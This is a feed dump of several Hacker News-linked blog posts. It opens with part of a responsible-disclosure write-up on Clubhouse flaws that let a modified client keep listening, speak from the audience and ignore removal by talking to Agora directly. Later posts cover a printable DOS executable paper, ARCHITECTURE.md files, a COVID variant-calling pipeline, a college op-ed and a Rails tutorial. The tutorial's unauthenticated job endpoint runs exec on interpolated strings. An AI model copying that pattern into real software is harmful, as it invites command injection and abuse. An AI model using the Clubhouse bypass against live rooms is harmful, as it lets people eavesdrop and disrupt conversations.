In the thread we found that, among other things, we can easily listen to a room without being displayed to the other room participants if we communicate directly with Agora.</p><p>Conversely, you can also be displayed in a room without listening. However, this is not really a problem - after all, even outside Clubhouse you are often present in conversations without really listening.</p><h2 id="-and-what-happened-next-">‚Ä¶ and what happened next ‚Ä¶</h2><p>After we published <a href="https://twitter.com/zerforschung/status/1354218368782508037">the Twitter thread</a>, we tried to play sound directly through Agora.
This still worked after we left the room - we could still participate in conversations.</p><video controls="">
<source src="https://d33wubrfki0l68.cloudfront.net/87d9be48b5f4f855673557bd2268476398ece4b3/461a7/m/clubhouse-fun/leave-room.mp4" type="video/mp4"><source src="https://d33wubrfki0l68.cloudfront.net/4564cee5098f5e5234844c16aec2dc45977a4e00/363c4/m/clubhouse-fun/leave-room.webm" type="video/webm"></video><p>Of course, we only tested the whole thing in private rooms so as not to disturb anyone.
The standard behaviour of Clubhouse in private rooms is that all participants are allowed to speak.
Clubhouse also has the feature of a virtual stage, especially for larger, public rooms.
Only those who have been brought onto this stage can speak audibly for the whole room, the rest remain in the virtual audience and can only listen.
After our previous experience, we suspected something bad, so we moved our test account to the Audience.
As expected, everyone in the room was immediately informed that the account could no longer speak and was now in the audience.
However, this account could continue to play sound without any problems, which could be heard throughout the room.</p><video controls="">
<source src="https://d33wubrfki0l68.cloudfront.net/b35bc8c3ac3e24ff95ec32e6017d65e218a74f3e/73335/m/clubhouse-fun/move-audience.mp4" type="video/mp4"><source src="https://d33wubrfki0l68.cloudfront.net/9cec51ef49da99794acc961a9cdb172d61110a7e/2b71f/m/clubhouse-fun/move-audience.webm" type="video/webm"></video><p>Again, the behaviour can be combined with the original discovery - the account can leave the room and then not only continue to listen, but also play sound that is transmitted to everyone in the room.</p><p><strong>Note</strong>: In public rooms, we must have been on stage at least once to speak. After that, however, no one can take away our permission to speak.
You can also activate the virtual stage in private rooms. We can always speak there, even if we had only been in the audience since joining the room.</p><hr><p>Unfortunately, the only feature of Clubhouse that a room moderator could use to prevent unwanted participants (and their audio) is also broken: the eject button.
This ‚ÄúRemove from Room‚Äù button only asks the Clubhouse app of the respective user to leave the room.
If the app is modified, it can simply ignore this request and remains in the room.</p><p>If you talk directly to the audio service provider Agora, all the moderation options of the Clubhouse app have no effect. The possibility to play sound continues to work until the room is finally closed for everyone.</p><video controls="">
<source src="https://d33wubrfki0l68.cloudfront.net/d1a1a4f527e5dcadbcfb23bc8a5da657f7d0a050/ca095/m/clubhouse-fun/remove-from-room.mp4" type="video/mp4"><source src="https://d33wubrfki0l68.cloudfront.net/de80647f96c9a6a6baee1ef4bee4fc10f99076a2/0ca56/m/clubhouse-fun/remove-from-room.webm" type="video/webm"></video><h2 id="-next-week-on-zerforschung">‚Ä¶ next week on zerforschung</h2><p>We will publish an article with all technical details as well as the tools we built in the course of the tests.
But first we want to give Clubhouse enough time to fix the described problems.</p><p>We have informed Clubhouse about the problems but have not received any feedback at the time of publication.</p><p>However: We have decided to publish this article anyway before fixing the problems, because in our view these problems are unfortunately (too) easy to find and can cause some damage if not known.</p><p>However, after a quick skim of the Agora interface documentation and Clubhouse‚Äôs use of it so far, we estimate that fixing the problem might be a bit more difficult after all.
But the details and a few fun things we found will follow soon, so stay tuned üöÄ‚ú®</p><div><p>All our work is done in our spare time, besides our jobs and general pandemic exhaustion.
If you like what we do and want to support us so we can do more nonsense like this or something else, you can check out our <a href="https://zerforschung.org/unterstuetzen/">support page</a>.</p><p>To stay up to date, follow us on <a href="https://twitter.com/zerforschung">Twitter</a> or subscribe to our <a href="https://zerforschung.org/index.xml">RSS feed</a></p></div><p>Audio in the sample videos: Kmart Radio Jingle &amp; Kmart Gift Certificates Announcement from <a href="https://archive.org/details/KmartDecember1992">https://archive.org/details/KmartDecember1992</a></p></div></div>]]>
            </description>
            <link>https://zerforschung.org/posts/clubhouse-endless-audio-fun-en</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127200</guid>
            <pubDate>Sat, 13 Feb 2021 21:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[C compiler for producing completely printable DOS executables]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26127161">thread link</a>) | @jstrieb
<br/>
February 13, 2021 | http://tom7.org/abc/ | <a href="https://web.archive.org/web/*/http://tom7.org/abc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>
ZM~~&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PRinty#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C&nbsp;with&nbsp;ABC!
</p>

<p>Hi! For <a href="http://sigbovik.org/2016/">SIGBOVIK 2017</a>, I created a strange <a href="http://tom7.org/abc/paper.pdf">paper</a>. This one may be a bit impenetrable for non computer scientists. If you have the time, I think reading the paper is the best way to experience it. But I also created the following video that explains the ideas involved, for interested non-experts or patient experts. It's long, at about 25 minutes, but you can always just skip to the end:

<iframe width="853" height="480" src="https://www.youtube.com/embed/LA_DrBwkiJA" frameborder="0" allowfullscreen=""></iframe>

</p><p>The paper in raw form is available as <a href="http://tom7.org/abc/paper.exe">PAPER.EXE</a> or <a href="http://tom7.org/abc/paper.txt">PAPER.TXT</a> (same file). Due to unreasonable SIGBOVIK deadlines, it's been updated a little compared to the version that appeared in SIGBOVIK 2017 (<a href="http://tom7.org/abc/abc.bib">bibtex</a>).

</p><p>The source code I used to create the paper is <a href="http://sourceforge.net/p/tom7misc/svn/HEAD/tree/trunk/abc/">here</a>.</p>

<p>Please leave a comment <a href="http://radar.spacebar.org/">on my blog</a> or on Twitter at <a href="http://twitter.com/tom7">@tom7</a>!
</p><p>Get all Tom 7 thingos at ‚Üí [<a href="http://tom7.org/">tom7.org</a>]</p>

</div></div></div>]]>
            </description>
            <link>http://tom7.org/abc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127161</guid>
            <pubDate>Sat, 13 Feb 2021 21:34:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architecture.md]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127138">thread link</a>) | @etherio
<br/>
February 13, 2021 | https://www.uzpg.me/tech/2020/07/21/architecture-md.html | <a href="https://web.archive.org/web/*/https://www.uzpg.me/tech/2020/07/21/architecture-md.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
        <div>

  

  <p><span>opensource</span></p><p>21 Jul 2020</p>


<p>3 minute read</p>

<p>Open Source Software and especially large projects have a few defined standards that are used to promote welcoming new contributors and ensure a healthy collaborative environment like for example <code>CONTRIBUTING.md</code>, <code>CODE_OF_CONDUCT.md</code>, and <a href="https://github.blog/2016-02-17-issue-and-pull-request-templates/">issue/pull request templates</a>.</p>

<p>Despite this, even in popular projects, there is a disconcerting lack of guidance on the actual structure of the software and its inner workings</p>

<p>For example, as a part of the <a href="https://codein.withgoogle.com/archive/">open source Google Code-in event</a>, last winter I started contributing and still contribute to <a href="https://github.com/publiclab/">Public Lab</a>, an environmental community that develops environmental software.</p>

<p>This forum‚Äôs code base is relatively large, especially for an open source beginner. It has about ~25 controllers, ~30 models and a very complete testing suite with functional, unit and system testing all automated with Travis.</p>

<p>But I took some time and read through the code to understand how the different bits and pieces of the app interacted, and grew to a confident level with some parts and at least an abstraction of understanding with the others. I luckily also had the help of my mentors who answered my questions during this process.</p>

<p>Obviously, this mentorship is often unavailable and new contributors have to scrutinize the code base on their own, and try to come up with a vague understanding of the components that will prevent them from creating a breaking change in another part of the app.</p>

<p>For example, in other industries, usually physical blueprints serve as this stepping stone to provide an overview of how the product works as a whole and yet it‚Äôs often missing in software engineering.</p>

<p>Let‚Äôs take an example. I‚Äôve been getting into the <a href="https://github.com/crystal-lang/crystal/">Crystal</a> programming language as a faster, type-checked alternative to Ruby. I really enjoyed the language and wanted to contribute and understand the code. I checked out their <a href="https://github.com/crystal-lang/crystal/blob/master/CONTRIBUTING.md"><code>CONTRIBUTING.md</code></a> and it provided me with mostly a social / collaborative overview of where I can discuss issues or ideas, where I can ask questions, etc‚Ä¶ What it did <strong>not</strong> provide was a <strong>technical</strong> overview of how the code is structured, the way it all comes together and its tech stack.</p>

<p>Putting this information would be helpful to not put off curious contributors that want to learn and develop a higher-level understanding of how the project works.</p>

<p>These frustrations are pushing me to propose a new ‚Äústandard‚Äù for welcoming open source contribution, an <code>ARCHITECTURE.md</code> file, that would work on top of <code>CONTRIBUTING.md</code> to inform on:</p>

<ul>
  <li>The tech stack, the backend / frontend / db / middleware technologies used</li>
  <li>The structure of the code and its logical links (diagrams :)), for example, crystal‚Äôs code is organised with <code>/src/modulename/submodule.cr</code> structure (ie <a href="https://github.com/crystal-lang/crystal/blob/master/src/csv/parser.cr"><code>/src/csv/parser.cr</code></a>, i.e. how does it all come together and what is the flow of the software. The <a href="https://www.infoq.com/articles/C4-architecture-model/">C4 model for software architecture</a> provide an instruction set for how engineers can use diagrams to easily explain their architecture.</li>
  <li>Specifications for testing and general guidelines on testing constraints for said project paired with details on the CI process</li>
</ul>

<p>It‚Äôs easy for the creators of a project to represent in their minds the way all the pieces of the project come together, but transcribing these pieces together into a document would be extremely beneficial, not only to teach others but also to clarify and renew one‚Äôs own understanding of their own code base.</p>

<p>If you have any other ideas for additional information it could contain, please comment! I think this could be incredibly useful in general to make access to open source projects easier and lower the learning curve.</p>


<p>Check out the <a href="https://tinyletter.com/uzpg_/">blog newsletter</a> to know when there are new posts / updates!</p>

<br>
<hr id="bottom">
<br>




</div>

    </div></div>]]>
            </description>
            <link>https://www.uzpg.me/tech/2020/07/21/architecture-md.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127138</guid>
            <pubDate>Sat, 13 Feb 2021 21:31:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Bioinformatics Pipeline to Detect and Understand Covid Mutants]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127002">thread link</a>) | @8iterations
<br/>
February 13, 2021 | https://mokasquarl.github.io/draftWA_cov/ | <a href="https://web.archive.org/web/*/https://mokasquarl.github.io/draftWA_cov/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h3 id="a-bioinformatics-pipeline-to-detect--understand-covid-mutants">A Bioinformatics Pipeline to Detect &amp; Understand COVID Mutants</h3>
<p><img src="https://mokasquarl.github.io/images/composite_border.png" alt="mutantcov" title="Mutant SARS-CoV-2 ACE2 Receptor Complex"></p>
<h4 id="fig-1-molecular-structure-with-uk-mutant-sars-cov-2-docked-to-human-receptor">Fig 1. Molecular Structure with UK Mutant SARS-CoV-2 Docked to Human Receptor</h4>
<p>As the pandemic runs its course, tracking genetic mutations has gained mainstream coverage. Officially, in the line of work we call bioinformatics, finding and understanding mutations is known as <em>Variant Calling</em>. In the same way every person is different from others (except twins), an individual virus can have variations in their genome; when a lot of these genetic variations accumulate between the virus we detected originally and what we find months later in a faraway town, we can say that we have a new <em>strain</em> of the virus. The Coronavirus which we‚Äôre now calling <em>SARS-CoV-2</em> was first detected in Wuhan‰∏≠ÂõΩ, so the genetic sequencing data from here is used as the base reference genome, and we measure mutations for the virus detected everywhere else against this; a coronavirus genome from a few towns away might only have a couple letters of the genome different from the Wuhan data, while something that‚Äôs travelled to the other side of the world after being transmitted through many people, climates, and even treatments, might now have acquired many more genetic variants compared to the original data.</p>
<h4 id="fig-2-retrieving-raw-covid-data-from-sra--creating-alignment-maps">Fig 2. Retrieving raw COVID data from SRA &amp; creating alignment maps</h4>
<p><img src="https://mokasquarl.github.io/images/render1612723995528-min.gif" alt="samtools tview" title="SARS-CoV-2 Aligned">
Data from viruses sequenced all across the world are uploaded into one of several databases (Table 1), this data is generated directly from machines by Illumina, Oxford Nanopore, or Life Technologies. When turning the molecules in genetic code into digital files these machines create strings that can be a few hundred letters in length to several thousand, but never the entire genome of the virus in a single string. A standardized file format called <em>fastq</em> holds all the strings from a single sample, including some quality data from the machine doing the sequencing. These strings are in no particular order, and first need to be mapped together to get the complete genome. Pretty much the standard way to create these genetic maps uses a technique invented in Palo Alto back in the early 90s by &nbsp;Michael Burrows and David Wheeler. The <em>Burrows‚ÄìWheeler Transform</em> was mostly just used in data compression, until around 2010 when computational biologists began to use it to align genomes together.</p>

<h4 id="table-1">Table 1.</h4>
<p><strong>SRA:</strong> <em>Sequence Read Archive</em> <strong>-Open Access</strong></p>

<p><strong>ENA:</strong> <em>European Nucleotide Archive</em> <strong>-Open Access</strong></p>

<p><strong>GISAID:</strong> <em>Global Initiative on Sharing All Influenza Data</em> <strong>-Private</strong></p>

<p>Heng Li, now a professor at Harvard (amongst other things) has created the most commonly used alignment algorithm (amongst other things) with <a href="https://github.com/lh3/bwa">BWA</a>. This algorithm is super easy to use, and will get us results that are more than good enough.</p>

<div><div><pre><code>git clone https://github.com/lh3/bwa.git
cd bwa
make
</code></pre></div></div>

<p>BWA takes <strong>fastq</strong> files containing samples, along with a <em>fasta</em> file containing a reference genome to map the strings contained in our <strong>fastq</strong> file. Reference genomes are usually put out by the scientific wing of a National Government, Regional Organizations, and some Universities. We‚Äôll get our Wuhan Coronavirus Reference genome from the <a href="https://www.ncbi.nlm.nih.gov/nuccore/1798174254">National Center for Biotechnology Information</a> hosted by the US Federal government. A good sample to run against the Wuhan reference is the Washington state outbreak that happened early in the US, the <em>fastq</em> data for this is also hosted by the NCBI at their <a href="https://trace.ncbi.nlm.nih.gov/Traces/sra/?run=SRR11278092">Sequence Read Archive</a>. In the animated terminal above (Fig 2.) we see the commands needed to create our mapped genome from our input files, including retrieving the data from the databases . If you‚Äôd like to skip all that, we‚Äôre hosting both the reference genome, and the completed alignment map over at <a href="https://lucidalign.com/#cov">Lucid Align</a>. We‚Äôll be using the <strong>bam</strong> file to detect our mutations, and we can also browse the genome of this Washington state outbreak sample using any sequence alignment viewer.</p>

<h4 id="fig-3-detecting-mutations-with-neural-network">Fig 3. Detecting Mutations with Neural Network</h4>
<p>
  <iframe src="https://www.youtube.com/embed/v5z5OV6UAVM" width="700" height="480" frameborder="0" allowfullscreen="">
  </iframe>
</p>

<p>But before going on to variant calling this first sample let‚Äôs just prepare another sample while we‚Äôre making these alignment maps. Let‚Äôs do a more recent outbreak, from Kent, UK; which is far from Wuhan &amp; the Washington sample, in both time &amp; space. Retrieving the samples from the European Nucleotide Archive can be done from this <a href="https://www.ebi.ac.uk/ena/browser/view/ERR4659819">link</a> or from the shell.</p>

<div><div><pre><code>git clone https://github.com/enasequence/enaBrowserTools.git
cd python3
enaDataGet.py -f fastq -m -d [output_directory] ERR4659819
</code></pre></div></div>

<p>Creating the mapped genome from the Kent, UK outbreak is done the exact same way as with the Washington state outbreak, and now both files can be browsed directly with an alignment viewer. More importantly now we can run the <em>variant detection</em> and see all the mutations in each of these samples compared to the original Wuhan reference genome. Variant callers are an area of hot development for folks working on bioinformatics algorithms &amp; tools. Traditionally, Bayesian methods have been most reliable, but are hard-coded for specific organisms or need the settings dialed-in to get the correct sensitivity to specificity. This is so that we don‚Äôt get too many false-positives, while at the same time don‚Äôt miss any real mutations. In the last couple of years deep convolutional neural networks have really made a splash in variant calling, where now images are created almost similar to those we see from alignment viewers, and those images are used to train, and then have the neural network make the call on whether there is a mutation in a given section of the alignment map as we make our way down the entire map.</p>

<p><img src="https://mokasquarl.github.io/images/eff_kent.png" alt="Annotated VCF" title="High Impact mutation in Kent UK sample"></p>
<h4 id="fig-4-annotated-mutations-of-kent-uk-strain-b117">Fig 4. Annotated Mutations of Kent UK Strain B.1.1.7</h4>

<p>Bayesian variant callers are fairly simple to install, whereas the DCNN callers will need, in our case, Nvidia cuda drivers, and of course a machine with those GPUs. You could use <a href="https://magnolia.sh/">Magnolia</a> Fig 3., the super-cool neural network based caller that Leo van Driel helped write B-), but for this post we are going to use the built-in caller that comes with <a href="http://www.htslib.org/download/"><em>samtools</em></a> written by the previously mentioned Heng Li.</p>

<div><div><pre><code>bcftools mpileup -Ou -f &lt;ref.fasta&gt; &lt;sample1.bam&gt; | bcftools call -vmO z -o &lt;study.vcf.gz&gt;
</code></pre></div></div>

<p>After running any variant caller, we‚Äôre left with a <em>vcf</em> file, which is just a list of positions in a genome where the sample has a mutation compared to the reference, it might be good to just look at the file <a href="https://samtools.github.io/hts-specs/VCFv4.2.pdf">format specifications</a> to understand how these <em>vcf</em> files will be used moving forward. We can use the allotted fields in the <em>vcf</em> format to annotate, that is give meaning &amp; context to each of the mutations we detect in the genome. For this sample we‚Äôve used <a href="https://pcingola.github.io/SnpEff/users_of_snpeff/">SnpEff</a> which makes life super easy by boiling all of the predicted effects of each of the mutations we detected into 3 simple categories, high impact, low, and moderate.</p>

<p>We can see in Fig 4. that running a standard Bayesian variant caller we detected a total of 48 mutations in the Kent UK sample. However, there might be some false-positives in there, it‚Äôs always better to be a bit more sensitive than to miss things. Let‚Äôs focus on the high impact mutations, things that will change the 3D structure of coronavirus. Looks like we only have 3 of those, all highlighted in red (Fig 4.), at genomic positions, 11288, 27972, and 28270. The VCF file we generated also contains data on which amino acids within the protein structure were changed to what, we can use that information to make the changes in our molecular structure, which in this case we‚Äôve done with a current tool under development.</p>
<h4 id="fig-5-molecular-structure-editor">Fig 5. Molecular Structure Editor</h4>
<p><img src="https://mokasquarl.github.io/images/dalton_beta.gif" alt="Dalton PDB" title="Editing Molecular Structure"></p>

<p>Mutations which change the molecular structure are super important because that is more likely to make things behave differently, this can mean it attaches to human receptors more tightly, interacts with antibodies and drugs differently, because remember at the core of how molecules behave is the old mantra <strong>‚Äúform equals function.</strong>‚Äù</p>

  </div></div>]]>
            </description>
            <link>https://mokasquarl.github.io/draftWA_cov/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127002</guid>
            <pubDate>Sat, 13 Feb 2021 21:14:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Whitman proposes deep cuts to humanities, arts and languages]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26126952">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://whitmanwire.com/opinion/2021/02/09/op-ed-whitman-proposes-deep-cuts-to-humanities-arts-and-languages/ | <a href="https://web.archive.org/web/*/https://whitmanwire.com/opinion/2021/02/09/op-ed-whitman-proposes-deep-cuts-to-humanities-arts-and-languages/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main"><p><span><p>This week, news was shared with a number of alumni about a recent proposal to generate budget savings through deep cuts to academic programs at Whitman. The proposal was created in response to a crisis in College finances brought on by COVID-19. Among the proposed cuts are six tenure-line positions in Classics, Environmental Humanities, History, Japanese, Mathematics and Statistics and Philosophy that will be eliminated after professors retire. Non-tenure-line positions in numerous other disciplines would also be cut, including Studio Art, Art History and Visual Culture Studies, Biology, Chinese, French, Japanese, Music, Politics, and Theater and Dance. Some adjunct faculty will not get their contracts renewed, while others will see their positions reduced. 68 percent of the faculty cuts are to the humanities and arts, and the cuts amount to 13.7 percent of the total humanities and arts faculty. Languages are taking a particularly big hit, with the proposed elimination of 24 percent of the total language faculty leading to the likely losses of the Classics, Chinese and Japanese majors. The future of the Environmental Humanities major will also be uncertain.</p>
<p>These cuts were developed by a Financial Sustainability Review committee and have blindsided the Faculty. They go against Whitman‚Äôs stated Strategic Priorities and violate the principle of shared governance, which gives the Faculty control over the curriculum. Last year, the Faculty were in the process of voting to strengthen the role of language study and environmental literacy in the General Education program. Some of the positions being cut, held by beloved retiring professors, are ones the Faculty previously identified as top priorities for hiring. The cuts also fall heavily on academics rather than on non-academic offices and programs in the College. Some of the proposed cuts, like the reduction of Classics faculty leading to the elimination of Latin and Greek language instruction and the major, are out-of-step with peer institutions. Others, like the loss of Don Snow‚Äôs position in Environmental Humanities after his retirement, will throw into doubt the future of a signature Whitman program.</p>
<p>More broadly, cutting nearly one seventh of the humanities and arts faculty will alter the future direction of the College. While crafted in response to the current crisis, the proposed changes will last far beyond it. President Murray communicated that the positions lost this year are unlikely to be reinstated in future years. They thus constitute a long-term shift in resources away from the arts and humanities.</p>
<p>Before the College embarks on such a significant change of course, it could stand to reflect on the value of the humanities, arts and languages at Whitman and in the world. However, the administration has indicated that it has no interest in doing this. The President and the Board of Trustees have given a deadline of February 15 to submit feedback on these proposed cuts. That said, some reflection on the value of the humanities and arts might be in order. The last few years have been tumultuous, and many of the problems we face are precisely what the humanities and arts are primed to address. Confronting political crises and fake news and working for social justice all require the creative, critical thinking that is developed in the very departments being cut. Language study and the intercultural awareness it facilitates are crucial to living in a multicultural, globalized world. As a liberal arts college, Whitman is the place for the in-depth study of the arts and humanities. A robust humanities faculty is one of the hallmarks of a Whitman education. In proceeding with these cuts, Whitman is jeopardizing not only its status as a liberal arts college, but also its mission of preparing students for lives of purpose.</p>
<p>Students and alumni who wish to speak up about these changes or the way they are taking place are encouraged to send their feedback (in separate emails) to President Murray, Professor Barry Balof and Professor Sharon Alker by February 15. Share your personal experience with any of the affected disciplines. Why is the discipline important to you? How did it shape your Whitman experience? Did it influence your decision to attend Whitman? How has it prepared you for life after Whitman?</p>
<p>Financial sustainability is essential to the continuing existence of Whitman College, but so are the arts and humanities. These cuts will transform the nature of the College, but they are not set in stone yet. As an alumni of the Divest Whitman campaign that successfully persuaded the College to divest its endowment of fossil fuel holdings, I know that when there is a groundswell of community sentiment on an issue, the College listens. Make your voice heard while there is still time. Speak up for the humanities, arts and languages at Whitman.</p>

<p>In solidarity with Whitties past, present and future,</p>
<p>Henry Allen</p>
<p>Class of 2015</p>
</span></p></div></div>]]>
            </description>
            <link>https://whitmanwire.com/opinion/2021/02/09/op-ed-whitman-proposes-deep-cuts-to-humanities-arts-and-languages/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126952</guid>
            <pubDate>Sat, 13 Feb 2021 21:10:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Schedule background jobs in Rails with Integromat]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26126907">thread link</a>) | @kw_dev
<br/>
February 13, 2021 | https://kwcodes.com/schedule-background-jobs-in-rails-with-integromat/ | <a href="https://web.archive.org/web/*/https://kwcodes.com/schedule-background-jobs-in-rails-with-integromat/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
            <!--kg-card-begin: markdown--><p>The most common tool for background jobs in Ruby on Rails is Sidekiq. Unfortunately, it's not standalone and it has Redis as a dependency. In this post, I will present an alternative approach for scheduling tasks in Rails.</p>
<blockquote>
<p>Oh come on! What's the problem with Sidekiq? It's well tested and widely used in many production apps!</p>
</blockquote>
<p>Please remember that I focus on product bootstrapping. Time to market is crucial. I'm also a one-man army and I try to minimize any unneeded maintenance.</p>
<p>To be able to use Sidekiq you need to set up and maintain a new service with Redis. It takes time and effort. I was looking for a solution to quickly implement scheduled jobs without any overhead for my Rails app: <a href="https://getaproductjob.com/?ref=kwcodes">Get a Product Job</a>.</p>
<blockquote>
<p>Fine, why cannot you just use cron?</p>
</blockquote>
<p>I'm using <a href="https://render.com/">Render</a> and its services don't have cron out of the box.</p>
<h2 id="solution">Solution</h2>
<p>I decided to use <a href="https://www.integromat.com/?pc=kwcodes">Integromat</a>. It's a tool for automating processes and it has an attractive free tier (1000 operations/month). Just enough for small side projects.</p>
<p>How to glue it with the Ruby on Rails app?</p>
<ol>
<li>Create a new controller with an action containing your task in <code>app/controllers/background_jobs_controller.rb</code>:</li>
</ol>
<pre><code>class BackgroundJobsController &lt; ApplicationController
  def cleanup
    async_rake "background:cleanup"
	# you can also pass environment variables as follows:
    # async_rake "background:cleanup", :dry_run =&gt; "false"
    head :ok
  end
end
</code></pre>
<ol start="2">
<li>Define a method to execute rake tasks asynchronously in <code>app/controllers/application_controller.rb</code>.</li>
</ol>
<pre><code>def async_rake(task, options = {})
  options[:rails_env] ||= Rails.env

  env_vars = options.map { |key, value| "#{key.to_s.upcase}='#{value.to_s}'" }
  env_vars_string = env_vars.join(' ')

  log_file = File.join(Rails.root, "log/async_rake.#{Rails.env}.log")

  Process.fork {
    exec("#{env_vars_string} bin/rake #{task} --trace 2&gt;&amp;1 &gt;&gt; #{log_file}")
  }
end
</code></pre>
<p>Implementation from <a href="https://gist.github.com/tompave/ae53fbab32ebebf1072e">https://gist.github.com/tompave/ae53fbab32ebebf1072e</a></p>
<ol start="3">
<li>Create a rake task <code>lib/tasks/background.rake</code> to perform any background logic you need:</li>
</ol>
<pre><code>namespace :background do
  task :cleanup =&gt; :environment do
    puts "üëã from the background task!"
  end
end
</code></pre>
<ol start="4">
<li>Add a new route in config/routes.rb</li>
</ol>
<pre><code>post '/task/cleanup', to: 'background_jobs#cleanup'
</code></pre>
<ol start="5">
<li>
<p>Go to <a href="https://www.integromat.com/?pc=kwcodes">Integromat</a> and create a new scenario.<br>
<img src="https://kwcodes.com/content/images/2021/02/Screenshot-2021-02-13-at-19.34.08-1.png" alt="Screenshot-2021-02-13-at-19.34.08-1"></p>
</li>
<li>
<p>Select <strong>HTTP</strong> and click click <strong>Continue</strong>.<br>
<img src="https://kwcodes.com/content/images/2021/02/Screenshot-2021-02-13-at-19.34.31-1.png" alt="Screenshot-2021-02-13-at-19.34.31-1"></p>
</li>
<li>
<p>Click on <strong>HTTP</strong> and select <strong>Make a request</strong>.<br>
<img src="https://kwcodes.com/content/images/2021/02/Screenshot-2021-02-13-at-19.39.33-1.png" alt="Screenshot-2021-02-13-at-19.39.33-1"><br>
<img src="https://kwcodes.com/content/images/2021/02/Screenshot-2021-02-13-at-19.39.44-2.png" alt="Screenshot-2021-02-13-at-19.39.44-2"></p>
</li>
<li>
<p>Configure <a href="https://www.integromat.com/?pc=kwcodes">Integromat</a> to make a request to <code>/task/cleanup</code> endpoint you just set up in the Rails app.<br>
<img src="https://kwcodes.com/content/images/2021/02/Screenshot-2021-02-13-at-19.45.56-1.png" alt="Screenshot-2021-02-13-at-19.45.56-1"></p>
</li>
<li>
<p>After saving a request click on a clock icon to configure when to send a request.<br>
<img src="https://kwcodes.com/content/images/2021/02/Screenshot-2021-02-13-at-19.44.11-1.png" alt="Screenshot-2021-02-13-at-19.44.11-1"></p>
</li>
<li>
<p>Set up when to fire your background task.<br>
<img src="https://kwcodes.com/content/images/2021/02/Screenshot-2021-02-13-at-19.44.17-1.png" alt="Screenshot-2021-02-13-at-19.44.17-1"></p>
</li>
<li>
<p>Save the scenario and that's all! You can run it once to test the whole setup.</p>
</li>
</ol>
<h2 id="summary">Summary</h2>
<p>What are the pros and cons of this approach?<br>
‚úÖ Quick implementation.<br>
‚úÖ No new layers to maintain (Redis + Sidekiq).<br>
‚úÖ Money saved on new services (quite important when you're just starting out and validating ideas).</p>
<p>üö® Not the safest solution. You might consider adding authorization or at least server-side checks to make sure that the task is not run too often.<br>
üö® For some of you, Integromat free tier might not be enough.<br>
üö® If not careful, you can easily exceed Integromat's free tier.</p>
<!--kg-card-end: markdown--><hr><!--kg-card-begin: html-->




<div>
  <h2>
    Follow my journey learning Ruby on Rails and trying to bootstrap a business.
  </h2>
  
  
  
  
</div>
    


<!--kg-card-end: html-->
    </div>
        
</article>                            </main>
</div>
        </div></div>]]>
            </description>
            <link>https://kwcodes.com/schedule-background-jobs-in-rails-with-integromat/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126907</guid>
            <pubDate>Sat, 13 Feb 2021 21:05:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Bestsnip ‚Äì Draw animations online with automatic inbetweening]]>
            </title>
            <description>
<![CDATA[
Score 61 | Comments 24 (<a href="https://news.ycombinator.com/item?id=26126906">thread link</a>) | @nevernothing
<br/>
February 13, 2021 | https://bestsnip.com/animation/ | <a href="https://web.archive.org/web/*/https://bestsnip.com/animation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://bestsnip.com/animation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126906</guid>
            <pubDate>Sat, 13 Feb 2021 21:05:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Display Connectors in Networking Equipment]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26126825">thread link</a>) | @todsacerdoti
<br/>
February 13, 2021 | https://eloydegen.com/blog/posts/display-connectors-networking-equipment/ | <a href="https://web.archive.org/web/*/https://eloydegen.com/blog/posts/display-connectors-networking-equipment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>It seems that networking equipment vendors have some tradition of using display connectors for other purposes.</p>
<p>HP, <a href="https://jackstromberg.com/2013/01/stacking-with-the-dell-powerconnect-5548s/">Dell</a> and Netgear use HDMI cables for stacking networking switches. According to <a href="https://serverfault.com/questions/408925/stacking-two-netgear-gs748ts-switches-via-hdmi-only-1gbps-trunk-bandwidth">this</a> Serverfault answer, a HDMI 1.3 or 1.4 compliant cable is needed for achieving the near 10Gbit theoretical throughput on Netgear hardware. The HDMI spec has specified the <a href="https://en.wikipedia.org/wiki/HDMI#HEC">HDMI Ethernet Channel (HEC)</a>, but that is only 100BASE-T, so these vendors have made a different implementation.</p>
